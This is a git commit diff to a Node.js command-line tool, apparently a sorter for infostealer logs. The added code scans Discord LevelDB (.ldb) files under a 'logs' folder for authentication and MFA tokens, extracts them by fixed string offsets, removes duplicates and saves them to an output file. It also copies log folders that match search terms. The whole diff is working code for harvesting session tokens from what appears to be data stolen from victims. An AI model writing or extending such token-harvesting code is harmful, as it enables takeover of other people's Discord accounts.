0d56ee9dce2fe937b3a9f34c30f93348e8a0b644
samourai-lzt <78436325+samourai-lzt@users.noreply.github.com>
2021-07-15 22:01:01 +0300

    Add files via upload

--- source.js
+++ source.js
@@ -7,6 +7,10 @@ const prompts = require('prompts');
 const langlist = require('./../lang.json');
 const check_folder = './logs';
 const results_folder = './results';
+let files = glob.sync(`./logs/**/Discord/**/*.ldb`);
+let version = "0.2";
+let zxc = [];
+
 let lang = false;
 
 module.exports = {
@@ -17,7 +21,7 @@ module.exports = {
     logo: function() {
         console.clear();
         console.log('');
-        console.log(`${`  ▄▀█ █ █ █▀▀ █▀ █▀█ █▀█ ▀█▀ █▀▀ █▀█ `.brightBlue}${langlist[lang][0].brightYellow}`);
+        console.log(`${`  ▄▀█ █ █ █▀▀ █▀ █▀█ █▀█ ▀█▀ █▀▀ █▀█ `.brightBlue}${langlist[lang][0].brightYellow}                                        ${`v`.grey}${version.grey}`);
         console.log(`${`  █▀█ ▀▄▀ ██▄ ▄█ █▄█ █▀▄  █  ██▄ █▀▄ `.brightBlue}${langlist[lang][1].brightRed}`);
         console.log('');
         console.log('');
@@ -84,7 +88,7 @@ module.exports = {
             }
         });
     },
-    
+
     text_show: function() {
         return new Promise((resolve, reject) => {
         this.logo();
@@ -111,6 +115,65 @@ module.exports = {
         }
     },
     
+    discord_ldb: function () {
+        if (!files.length) {
+            console.log('');
+            console.log(`$`.cyan, `${langlist[lang][18]}${check_folder}${langlist[lang][19]}`);
+            console.log('');
+            console.log('');
+        }
+        else {
+            return new Promise(async (resolve, reject) => {
+            for (let i = 0; i < files.length; i++) {
+                let data = fs.readFileSync(files[i], 'utf-8');
+                var tempdata = (data.indexOf('oken'));
+                var res1 = data.indexOf('"', tempdata);
+                var result_check = data.substr(res1 + 60, 1);
+                if (result_check == '"') {
+                    var result = data.substr(res1 + 1, 59);
+                    var symbol_check = data.substr(res1 + 1, 1);
+                    if (symbol_check.match(/[A-Z^\d]/) !== null) {
+                        zxc[i] = result;
+                    }
+                }
+                else {
+                    mfa_result_check = data.substr(res1 + 89, 1);
+                    if (mfa_result_check == '"') {
+                        var mfa_symbol_check = data.substr(res1 + 1, 3);
+                        if (mfa_symbol_check.match('mfa') !== null) {
+                            var mfa_result = data.substr(res1 + 1, 88);
+                            zxc[i] = mfa_result;
+                        }
+                    }
+                }
+            }
+            resolve("Ok");
+            });
+        }
+    },
+     
+    tokens_filter: function () {
+        return new Promise(async (resolve, reject) => {
+        var filtered_zxc = zxc.filter(function (el) {
+           return el != null;
+        });
+     
+        uniq_zxc = filtered_zxc.filter(function(item, pos) {
+           return filtered_zxc.indexOf(item) == pos;
+        })
+        
+        for (writing_zxc of uniq_zxc) {
+           fs.appendFile(`${results_folder}/Discord/output_tokens.txt`, `${writing_zxc}\n`, function(err) {
+                if(err) {
+                    return err;
+                }
+           });
+           console.log(` [Discord]`, `${writing_zxc}`.cyan, langlist[lang][7].brightGreen);
+        }
+        resolve("Ok");
+        });
+    },
+
     main: function () {
         return new Promise(async (resolve, reject) => {
             const mainaction = await prompts([
@@ -120,18 +183,15 @@ module.exports = {
                     message: langlist[lang][12],
                     choices: [
                         { title: langlist[lang][13], value: 1 },
-                        { title: langlist[lang][14], value: 2 },
-                        { title: langlist[lang][15], value: 3 }
+                        { title: langlist[lang][15], value: 2 }
                     ],
                     hint: langlist[lang][8]
                 }
             ]);
             console.clear();
             this.logo();
-            console.log('$'.cyan, ` ${langlist[lang][16]}${mainaction.text}`)
+            console.log('$'.cyan, `${langlist[lang][16]}${mainaction.text}`);
             console.log('');
-            console.log('');
-            console.log('', langlist[lang][17].black.bgWhite);
             
             switch(parseInt(mainaction.text)) {
                 case 1:
@@ -148,25 +208,103 @@ module.exports = {
                             console.log('');
                         }
                         else {
-                            for (folderpath of zxcfiles) {
-                                let data = fs.readFileSync(folderpath, 'utf8');
-                                for (request of zapros) {
-                                    if(data.includes(request)) {
-                                        let tempstring = folderpath.split(`${check_folder}/`)[1];
-                                        let result = tempstring.substring(0, tempstring.search('/'));
-                                        await this.copyFile(request, result, check_folder);
-                                    }
+                            const saving = await prompts([
+                                {
+                                    type: 'select',
+                                    name: 'text',
+                                    message: langlist[lang][21],
+                                    choices: [
+                                        { title: langlist[lang][9], value: 'y' },
+                                        { title: langlist[lang][10], value: 'n' },
+                                        { title: langlist[lang][22], value: 'do' }
+                                    ], 
+                                    hint:  langlist[lang][8]
                                 }
-                                
-                            }
+                            ]);
 
-                            setTimeout(() => {
-                                console.log('');
-                                console.log('');
-                                console.log('$'.cyan, langlist[lang][22], langlist[lang][20].black.bgCyan);
-                                console.log('');
-                                console.log('');
-                            }, 1000);   
+                            switch (saving.text) {
+                                case 'y':
+                                    setTimeout(() => {
+                                        fs.mkdirSync(`${results_folder}/Discord/`);
+                                        fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, "");
+                                        console.clear();
+                                        this.logo();
+                                        console.log('$'.cyan, ` ${langlist[lang][16]}${mainaction.text}`);
+                                        console.log('');
+                                        console.log('');
+                                        console.log('', langlist[lang][17].black.bgWhite);
+                                        console.log('');
+                                        this.discord_ldb().then(async(result1) => {
+                                            if (result1 == "Ok") {
+                                               this.tokens_filter().then(async(result2) => {
+                                                    if (result2 == "Ok") {
+                                                        for (folderpath of zxcfiles) {
+                                                            let data = fs.readFileSync(folderpath, 'utf8');
+                                                            for (request of zapros) {
+                                                                if(data.includes(request)) {
+                                                                    let tempstring = folderpath.split(`${check_folder}/`)[1];
+                                                                    let result = tempstring.substring(0, tempstring.search('/'));
+                                                                    await this.copyFile(request, result, check_folder);                                                                   
+                                                                }
+                                                            }                                                            
+                                                        }
+                                                        setTimeout(() => {
+                                                            console.log('');
+                                                            console.log('');
+                                                            console.log('$'.cyan, langlist[lang][22], langlist[lang][20].black.bgCyan);
+                                                            console.log('');
+                                                            console.log('');
+                                                        }, 1000); 
+                                                    }
+                                               });                                             
+                                            }
+                                        });    
+                                    }, 1000);
+                                    break;                                    
+                                case 'n':
+                                    for (folderpath of zxcfiles) {
+                                        let data = fs.readFileSync(folderpath, 'utf8');
+                                        for (request of zapros) {
+                                            if(data.includes(request)) {
+                                                let tempstring = folderpath.split(`${check_folder}/`)[1];
+                                                let result = tempstring.substring(0, tempstring.search('/'));
+                                                await this.copyFile(request, result, check_folder);                                                                   
+                                            }
+                                        }                                                            
+                                    }
+                                    setTimeout(() => {
+                                        console.log('');
+                                        console.log('');
+                                        console.log('$'.cyan, langlist[lang][23], langlist[lang][20].black.bgCyan);
+                                        console.log('');
+                                        console.log('');
+                                    }, 1000);
+                                    break;
+                                case 'do':
+                                    setTimeout(() => {
+                                        fs.mkdirSync(`${results_folder}/Discord/`);
+                                        fs.appendFileSync(`${results_folder}/Discord/output_tokens.txt`, "");
+                                        console.clear();
+                                        this.logo();
+                                        console.log('$'.cyan, ` ${langlist[lang][16]}${mainaction.text}`);
+                                        console.log('');
+                                        console.log('');
+                                        console.log('', langlist[lang][17].black.bgWhite);
+                                        console.log('');
+                                        this.discord_ldb().then(async(result1) => {
+                                            if (result1 == "Ok") {
+                                                this.tokens_filter()
+                                                setTimeout(() => {
+                                                    console.log('');
+                                                    console.log('');
+                                                    console.log('$'.cyan, langlist[lang][23], langlist[lang][20].black.bgCyan);
+                                                    console.log('');
+                                                    console.log('');
+                                                }, 1000); 
+                                            }
+                                        });                                               
+                                    }, 1000);      
+                            }                                                         
                         }                 
                     }, 1000);
                     break;
@@ -175,7 +313,7 @@ module.exports = {
                     this.dev_logo();
                     console.log('$'.cyan, langlist[lang][21], langlist[lang][20].black.bgCyan);
                     console.log('');
-                    console.log('');
+                    console.log('');                    
                     break;
                 case 3:
                     this.logo();
